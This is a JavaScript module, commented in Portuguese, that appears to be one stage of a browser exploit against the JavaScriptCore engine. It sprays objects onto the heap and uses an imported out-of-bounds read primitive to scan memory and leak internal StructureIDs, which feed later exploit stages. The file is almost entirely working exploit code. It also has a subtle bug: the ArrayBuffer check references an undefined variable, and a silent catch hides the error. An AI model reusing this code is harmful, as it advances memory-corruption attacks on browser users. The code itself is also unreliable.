// js/script3/readStructureIDs.mjs
// CORREÇÃO: Adicionar LONG_PAUSE_S3 à importação
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const MAX_SPRAY_OBJS_FOR_ID_LEAK = 50;
const DEFAULT_AB_SIZE_FOR_ID_LEAK = 64;
// LONG_PAUSE_S3_DISCOVERY removido, usaremos LONG_PAUSE_S3 importado


async function findAndLogStructureIDInternal(objectFactory, objectTypeName, verificationLogicFn, logFn = logS3, currentAttemptInfo = "") {
    const FNAME = `findAndLogStructureIDInternal<${objectTypeName}>`;
    logFn(` ${currentAttemptInfo} Tentando encontrar StructureID de: ${objectTypeName}`, "info", FNAME);

    if (!oob_array_buffer_real) {
        logFn("ERRO: Ambiente OOB não configurado antes de chamar findAndLogInternal. Abortando.", "error", FNAME);
        return null;
    }

    logFn(` Pulverizando ${MAX_SPRAY_OBJS_FOR_ID_LEAK} instâncias de ${objectTypeName}...`, "info", FNAME);
    let sprayedObjects = [];
    for (let i = 0; i < MAX_SPRAY_OBJS_FOR_ID_LEAK; i++) {
        try { sprayedObjects.push(objectFactory()); } catch (e) { /* ignorar */ }
    }
    if (sprayedObjects.length === 0) {
        logFn(`Nenhum objeto ${objectTypeName} pulverizado.`, "warn", FNAME);
        return null;
    }
    logFn(`  ${sprayedObjects.length} objetos ${objectTypeName} pulverizados. Pausando...`, "good", FNAME);
    await PAUSE_S3(250);

    let foundStructureID = null;
    const structureIdOffsetInCell = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const readUnitForScan = 4;

    const searchStart = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (DEFAULT_AB_SIZE_FOR_ID_LEAK * 20));
    const searchEnd = oob_array_buffer_real.byteLength - Math.max(structureIdOffsetInCell + readUnitForScan,
        (parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START,16) || 0) + 4,
        (parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET,16) || 0) + 8,
        (parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET,16) || 0) + 8
        ) - 8;

    logFn(` Varrendo de ${toHex(searchStart)} a ${toHex(searchEnd)} (oob_real_len: ${toHex(oob_array_buffer_real.byteLength)})`, "info", FNAME);
    let lastLoggedProgressOffset = searchStart;

    for (let candidateBaseAbsOffset = searchStart; candidateBaseAbsOffset < searchEnd; candidateBaseAbsOffset += 8) {
        if (!oob_array_buffer_real) {
            logFn("   ERRO CRÍTICO: oob_array_buffer_real nulo durante varredura!", "error", FNAME);
            break;
        }
        try {
            const verificationResult = await verificationLogicFn(candidateBaseAbsOffset, objectTypeName, logFn);
            if (verificationResult !== null && verificationResult !== undefined) {
                foundStructureID = verificationResult;
                break;
            }
        } catch (e_verify) { /* Silencioso */ }

        if (candidateBaseAbsOffset > lastLoggedProgressOffset + (1024 * 20)) {
            logFn(`   Varredura de ID para ${objectTypeName} em ${toHex(candidateBaseAbsOffset)}...`, "info", FNAME);
            lastLoggedProgressOffset = candidateBaseAbsOffset;
            await PAUSE_S3(5);
        }
    }

    sprayedObjects = null;
    if (foundStructureID === null) {
        logFn(`StructureID para ${objectTypeName} não encontrado em ${currentAttemptInfo}.`, "warn", FNAME);
    }
    return foundStructureID;
}

async function verifyArrayBufferAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const sizeOffsetInABObject = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const FNAME_VERIFY = `verifyAB_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(sizeOffsetInABObject + 4, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const potentialSize = oob_read_absolute(baseAbsOffsetInOOB + sizeOffsetInAB, 4, logFn);
        if (potentialSize === DEFAULT_AB_SIZE_FOR_ID_LEAK) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: Tamanho OK (${DEFAULT_AB_SIZE_FOR_ID_LEAK}). StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyJSFunctionAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const executableOffset = parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET, 16);
    const FNAME_VERIFY = `verifyFunc_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(executableOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + executableOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr) && (ptr.low() !== 0 || ptr.high() !== 0) && ptr.low() !== 0xFFFFFFFF) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
             if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ExecutablePtr OK (${ptr.toString(true)}). StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyGenericJSObjectAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const butterflyOffset = parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16);
    const FNAME_VERIFY = `verifyObj_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(butterflyOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + butterflyOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr)) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ButterflyPtr ${ptr.toString(true)}. StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

export async function discoverStructureIDs() {
    const FNAME_MAIN = "discoverStructureIDs";
    logS3(`==== INICIANDO Descoberta de StructureIDs (S3) v1.4 ====`, "test", FNAME_MAIN);
    const results = {
        ArrayBuffer: null,
        JSFunction: null,
        JSObjectGeneric: null,
    };
    const MAX_GLOBAL_ATTEMPTS = 1; // Reduzido para teste

    const typesToDiscover = [
        { name: "ArrayBuffer", factory: () => new ArrayBuffer(DEFAULT_AB_SIZE_FOR_ID_LEAK), verifier: verifyArrayBufferAndReturnID, resultField: "ArrayBuffer" },
        { name: "JSFunction", factory: () => function() { let a=1; return a+1; }, verifier: verifyJSFunctionAndReturnID, resultField: "JSFunction" },
        { name: "JSObjectGeneric", factory: () => ({a:1, b:2}), verifier: verifyGenericJSObjectAndReturnID, resultField: "JSObjectGeneric" },
    ];

    for (let attempt = 1; attempt <= MAX_GLOBAL_ATTEMPTS; attempt++) {
        logS3(`--- Tentativa Global de Descoberta de IDs #${attempt}/${MAX_GLOBAL_ATTEMPTS} ---`, "info", FNAME_MAIN);

        for (const typeInfo of typesToDiscover) {
            if (results[typeInfo.resultField]) continue; // Já encontrado

            await triggerOOB_primitive(logS3);
            if (!oob_array_buffer_real) {
                logS3(`Falha OOB, pulando ${typeInfo.name} nesta tentativa.`, "error", FNAME_MAIN);
                continue;
            }
            results[typeInfo.resultField] = await findAndLogStructureIDInternal(
                typeInfo.factory,
                typeInfo.name,
                typeInfo.verifier,
                logS3,
                `GlobalAttempt#${attempt}`
            );
            clearOOBEnvironment(logS3);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (Object.values(results).every(val => val !== null && val !== undefined)) {
            logS3("Todos os StructureIDs alvo foram encontrados ou todas as tentativas foram feitas para eles.", "good", FNAME_MAIN);
            break;
        }
        if (attempt < MAX_GLOBAL_ATTEMPTS) {
            logS3("Pausa longa antes da próxima tentativa global de descoberta de IDs...", "info", FNAME_MAIN);
            await PAUSE_S3(LONG_PAUSE_S3 * 2); // Usa LONG_PAUSE_S3 importado
        }
    }

    logS3("--- Resultados Finais da Descoberta de StructureIDs ---", "test", FNAME_MAIN);
    for (const typeName in results) {
        if (results[typeName] !== null && results[typeName] !== undefined) {
            logS3(`  ${typeName}: ${toHex(results[typeName])}`, "good", FNAME_MAIN);
        } else {
            logS3(`  ${typeName}: Não encontrado ou inválido`, "warn", FNAME_MAIN);
        }
    }
    logS3("PREENCHA OS VALORES ENCONTRADOS EM KNOWN_STRUCTURE_IDS NO SEU config.mjs!", "critical", FNAME_MAIN);
    logS3(`==== Descoberta de StructureIDs CONCLUÍDA ====`, "test", FNAME_MAIN);
}
